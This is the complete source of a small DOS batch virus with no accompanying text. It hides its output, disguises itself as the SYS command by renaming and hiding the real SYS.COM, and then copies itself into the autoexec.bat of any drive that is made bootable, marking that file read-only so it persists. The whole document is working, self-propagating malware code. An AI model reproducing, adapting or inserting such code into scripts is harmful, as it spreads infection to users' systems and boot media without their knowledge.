@ctty nul
set sys=%windir%
if "%0"=="sys.bat" goto syst
if "%0"=="sys" goto syst
if exist c:\windows\command\sys.old goto end
copy %0 %sys%\command\sys.bat
ren %sys%\command\sys.com sys.old
attrib c:\windows\command\sys.old +h
goto end
:syst
attrib %sys%\command\sys.old -h
ren %sys%\command\sys.old sys.com
sys.com %1 %2
ren %sys%\command\sys.com sys.old
attrib %sys%\command\sys.old +h
copy %sys%\command\sys.bat %1\autoexec.bat >nul
copy %sys%\command\attrib.exe %1\attrib.exe >nul
type %0 >> %1\autoexec.bat
attrib %1\autoexec.bat +r
:end
